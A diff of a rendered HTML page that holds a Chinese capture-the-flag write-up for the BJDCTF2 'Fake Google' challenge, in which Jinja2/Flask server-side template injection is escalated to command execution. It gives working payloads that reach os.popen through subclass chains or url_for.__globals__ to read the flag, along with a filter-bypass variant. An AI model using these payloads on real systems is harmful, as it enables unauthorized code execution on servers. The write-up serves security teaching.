@@ -4562,16 +4562,16 @@
 <hr />
 <h3 id="_2"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_2">解题过程</a></h3>
 <h4 id="step-1"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#step-1">Step 1：确认模板被执行</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>{{7*7}}   →  49
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>{{7*7}}   →  49
 </span></code></pre></div>
 <p><strong>如果回显的是 <code>{{7*7}}</code> 原文，说明只是字符串拼接；回显 49，说明你的输入进了模板引擎，被真的求值了。</strong></p>
 <h4 id="step-2-jinja2"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#step-2-jinja2">Step 2：确认是 Jinja2</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>{{7*'7'}}  →  7777777
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>{{7*'7'}}  →  7777777
 </span></code></pre></div>
 <p><img alt="Jinja2 确认" src="../../../assets/images/bjdctf2-fake-google/01-jinja2-7777777.png" /></p>
 <p><strong>这个探针是用来区分引擎的：Jinja2 里 <code>'7'</code> 是字符串，重复 7 次得到 <code>7777777</code>；Twig（PHP）里会当成数字，得到 49。</strong></p>
 <h4 id="step-3-flask"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#step-3-flask">Step 3：确认是 Flask</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>{{config}}   →  Flask 的配置对象
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>{{config}}   →  Flask 的配置对象
 </span></code></pre></div>
 <p><strong><code>config</code> 是 Flask 注入模板的全局变量。它出现就说明是 Flask，顺便还可能看到 SECRET_KEY。</strong></p>
 <p><strong>到这一步，两条路都可以走了。</strong></p>
@@ -4579,69 +4579,69 @@
 <h3 id="_3"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_3">路线一：从字面量往上爬（通用链）</a></h3>
 <p><strong>这条路不依赖任何框架给的名字，只靠 Python 的对象关系。</strong></p>
 <h4 id="_4"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_4">第一环：字符串的类</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>{{''.__class__}}     →  &lt;class 'str'&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>{{''.__class__}}     →  &lt;class 'str'&gt;
 </span></code></pre></div>
 <h4 id="_5"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_5">第二环：它的父类</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>{{''.__class__.__bases__[0]}}   →  &lt;class 'object'&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>{{''.__class__.__bases__[0]}}   →  &lt;class 'object'&gt;
 </span></code></pre></div>
 <p><strong>⚠️ 这里有个坑：<code>__base__</code>（单数）是</strong>一个类<strong>，不能下标；<code>__bases__</code>（复数）是</strong>元组<strong>，才能写 <code>[0]</code>。写成 <code>__base__[0]</code> 会返回空。</strong></p>
 <h4 id="_6"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_6">第三环：所有子类</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>{{''.__class__.__bases__[0].__subclasses__()}}   →  一大串类
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>{{''.__class__.__bases__[0].__subclasses__()}}   →  一大串类
 </span></code></pre></div>
 <p><strong>这一步是分水岭：拿到的是内存里</strong>所有已加载的类<strong>。</strong></p>
 <h4 id="_7"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_7">第四环：找一个“身上带着模块全局空间”的类</a></h4>
 <p><strong>核心思路：找一个 <code>__init__.__globals__</code> 里带 <code>__builtins__</code> 或者直接带 <code>os</code> 的类。</strong></p>
 <p><strong>常见的几个候选：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>catch_warnings        → warnings 模块，globals 里有 __builtins__
-</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>_wrap_close           → os 模块，globals 里直接有 popen
-</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>Popen                 → subprocess
-</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>FileLoader            → importlib
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>catch_warnings        → warnings 模块，globals 里有 __builtins__
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>_wrap_close           → os 模块，globals 里直接有 popen
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>Popen                 → subprocess
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>FileLoader            → importlib
 </span></code></pre></div>
 <p><strong>怎么知道它们在列表第几个？我写了个本地脚本扫了一遍：</strong></p>
 <p><img alt="脚本找下标" src="../../../assets/images/bjdctf2-fake-google/02-script-indices.png" /></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
-</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">((</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">())):</span>
-</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>    <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">'catch_warnings'</span><span class="p">,</span> <span class="s1">'_wrap_close'</span><span class="p">,</span> <span class="s1">'Popen'</span><span class="p">,</span> <span class="s1">'FileLoader'</span><span class="p">):</span>
-</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="p">,</span> <span class="s1">'-&gt;'</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="vm">__module__</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="p">)</span>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">((</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">())):</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>    <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">'catch_warnings'</span><span class="p">,</span> <span class="s1">'_wrap_close'</span><span class="p">,</span> <span class="s1">'Popen'</span><span class="p">,</span> <span class="s1">'FileLoader'</span><span class="p">):</span>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="p">,</span> <span class="s1">'-&gt;'</span><span class="p">,</span> <span class="n">c</span><span class="o">.</span><span class="vm">__module__</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="p">)</span>
 </span></code></pre></div>
 <p><strong>⚠️ 下标是环境相关的。</strong>同样的脚本，在不同 Python 版本、不同 import 顺序下会给出不同的数字。我这边 <code>catch_warnings</code> 是 169、<code>_wrap_close</code> 是 117，靶机正好一致才打通的。<strong>换个环境就得重扫，或者用按名字筛的写法</strong>（见文末）。</p>
 <h4 id="_wrap_close-popen"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_wrap_close-popen">第五环：用 <code>_wrap_close</code> 直接拿 popen</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>{{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()}}
 </span></code></pre></div>
 <p><strong><code>_wrap_close</code> 是 <code>os</code> 模块里的类，它的 <code>__init__.__globals__</code> 就是 <code>os</code> 模块的全局空间，里面直接有 <code>popen</code>，一步到位。</strong></p>
 <h4 id="catch_warnings-__builtins__"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#catch_warnings-__builtins__">另一种：用 <code>catch_warnings</code> 走 <code>__builtins__</code></a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>{{''.__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>{{''.__class__.__bases__[0].__subclasses__()[169].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /f*').read()")}}
 </span></code></pre></div>
 <p><strong>为什么要绕 <code>eval</code> 和 <code>__import__</code>？因为 <code>catch_warnings</code> 的 globals 里没有 <code>os</code>，但有 <code>__builtins__</code>；<code>__builtins__</code> 里有 <code>__import__</code>，能 import 就能拿到任何模块。</strong></p>
 <p><strong>（<code>__builtins__</code> 在不同上下文里有时是 dict、有时是模块，所以有的写法用 <code>['__builtins__']</code>，有的用 <code>.builtins__</code>——注意前者是取键，后者是取属性。）</strong></p>
 <hr />
 <h3 id="_8"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_8">路线二：从框架给的钩子走（快）</a></h3>
 <p><strong>既然确认了是 Flask，就先看看模板里现成给了什么：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>{{url_for}}   →  &lt;function url_for at 0x...&gt;
 </span></code></pre></div>
 <p><img alt="url_for" src="../../../assets/images/bjdctf2-fake-google/03-url-for.png" /></p>
 <p><strong>它是函数——函数身上就有 <code>__globals__</code>。所以不需要爬几百个子类：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>{{url_for.__globals__}}                  →  一大坨 dict
-</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>{{(url_for.__globals__)['os']}}          →  &lt;module 'os' ...&gt;
-</span><span id="__span-75-3"><a id="__codelineno-75-3" name="__codelineno-75-3" href="#__codelineno-75-3"></a>{{(url_for.__globals__)['os'].popen('cat /f*').read()}}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>{{url_for.__globals__}}                  →  一大坨 dict
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>{{(url_for.__globals__)['os']}}          →  &lt;module 'os' ...&gt;
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>{{(url_for.__globals__)['os'].popen('cat /f*').read()}}
 </span></code></pre></div>
 <p><strong>三行就出 flag。</strong></p>
 <p><strong>这就是两条路的区别：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>路线一（长）：'' → 类 → 父类 → 所有子类 → 挑一个 → __globals__ → 执行
-</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>路线二（短）：url_for → __globals__ → os → 执行
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>路线一（长）：'' → 类 → 父类 → 所有子类 → 挑一个 → __globals__ → 执行
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>路线二（短）：url_for → __globals__ → os → 执行
 </span></code></pre></div>
 <p><strong>路线二快，但依赖 Flask 注入了 <code>url_for</code>；路线一慢，但只要是 Python 就通。实战里先试短的，不通再走长的。</strong></p>
 <hr />
 <h3 id="_9"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_9">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>一个输入框 → 试 SQL 注入，内容被原样打印
-</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>  → 看源码，qaq 里有提示 sssssti
-</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>    → {{7*7}} = 49        确认模板被执行
-</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a>      → {{7*'7'}} = 7777777  确认是 Jinja2
-</span><span id="__span-77-5"><a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a>        → {{config}}        确认是 Flask
-</span><span id="__span-77-6"><a id="__codelineno-77-6" name="__codelineno-77-6" href="#__codelineno-77-6"></a>          ├─ 路线一：'' → __class__ → __bases__[0] → __subclasses__()
-</span><span id="__span-77-7"><a id="__codelineno-77-7" name="__codelineno-77-7" href="#__codelineno-77-7"></a>          │           → 挑 _wrap_close(117) / catch_warnings(169)
-</span><span id="__span-77-8"><a id="__codelineno-77-8" name="__codelineno-77-8" href="#__codelineno-77-8"></a>          │             → __init__.__globals__ → popen / __builtins__ → 执行
-</span><span id="__span-77-9"><a id="__codelineno-77-9" name="__codelineno-77-9" href="#__codelineno-77-9"></a>          └─ 路线二：url_for → __globals__ → ['os'] → popen → 执行
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>一个输入框 → 试 SQL 注入，内容被原样打印
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>  → 看源码，qaq 里有提示 sssssti
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>    → {{7*7}} = 49        确认模板被执行
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>      → {{7*'7'}} = 7777777  确认是 Jinja2
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>        → {{config}}        确认是 Flask
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>          ├─ 路线一：'' → __class__ → __bases__[0] → __subclasses__()
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a>          │           → 挑 _wrap_close(117) / catch_warnings(169)
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a>          │             → __init__.__globals__ → popen / __builtins__ → 执行
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a>          └─ 路线二：url_for → __globals__ → ['os'] → popen → 执行
 </span></code></pre></div>
 <h4 id="_10"><a class="toclink" href="../../bjdctf2-fake-google-ssti/#_10">漏洞原理</a></h4>
 <p><strong>① Jinja2 的 <code>{{ }}</code> 里是表达式，会被求值</strong></p>
@@ -4708,19 +4708,19 @@
 <hr />
 <details class="note">
 <summary>两条链的完整 payload（本题实测）</summary>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="x"># 路线一 · _wrap_close：globals 里直接有 popen</span>
-</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">117</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'popen'</span><span class="o">](</span><span class="s1">'cat /flag'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a>
-</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a><span class="x"># 路线一 · catch_warnings：走 __builtins__ → __import__</span>
-</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#__codelineno-78-5"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">169</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eval'</span><span class="o">](</span><span class="s2">"__import__('os').popen('cat /f*').read()"</span><span class="o">)</span><span class="cp">}}</span>
-</span><span id="__span-78-6"><a id="__codelineno-78-6" name="__codelineno-78-6" href="#__codelineno-78-6"></a>
-</span><span id="__span-78-7"><a id="__codelineno-78-7" name="__codelineno-78-7" href="#__codelineno-78-7"></a><span class="x"># 路线二 · url_for 短路</span>
-</span><span id="__span-78-8"><a id="__codelineno-78-8" name="__codelineno-78-8" href="#__codelineno-78-8"></a><span class="cp">{{</span><span class="o">(</span><span class="nv">url_for.__globals__</span><span class="o">)[</span><span class="s1">'os'</span><span class="o">]</span><span class="nv">.popen</span><span class="o">(</span><span class="s1">'cat /f*'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="x"># 路线一 · _wrap_close：globals 里直接有 popen</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">117</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'popen'</span><span class="o">](</span><span class="s1">'cat /flag'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="x"># 路线一 · catch_warnings：走 __builtins__ → __import__</span>
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()[</span><span class="m">169</span><span class="o">]</span><span class="nv">.__init__.__globals__</span><span class="o">[</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eval'</span><span class="o">](</span><span class="s2">"__import__('os').popen('cat /f*').read()"</span><span class="o">)</span><span class="cp">}}</span>
+</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>
+</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="x"># 路线二 · url_for 短路</span>
+</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="cp">{{</span><span class="o">(</span><span class="nv">url_for.__globals__</span><span class="o">)[</span><span class="s1">'os'</span><span class="o">]</span><span class="nv">.popen</span><span class="o">(</span><span class="s1">'cat /f*'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
 </span></code></pre></div>
 </details>
 <details class="note">
 <summary>跨环境更稳的写法：按名字找，不记下标</summary>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="s1">'__init__'</span><span class="o">)</span><span class="nv">.__globals__</span><span class="cp">}}</span>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="cp">{{</span><span class="s1">''</span><span class="nv">.__class__.__bases__</span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="nv">.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="s1">'__init__'</span><span class="o">)</span><span class="nv">.__globals__</span><span class="cp">}}</span>
 </span></code></pre></div>
 <p><strong><code>selectattr</code> 按属性名筛，<code>\first</code> 取第一个 —— 不需要知道它在第几个。</strong>
 <strong>如果连 <code>.__globals__</code> 这种形状都被过滤，就换成 <code>|attr('__globals__')</code>。</strong></p>
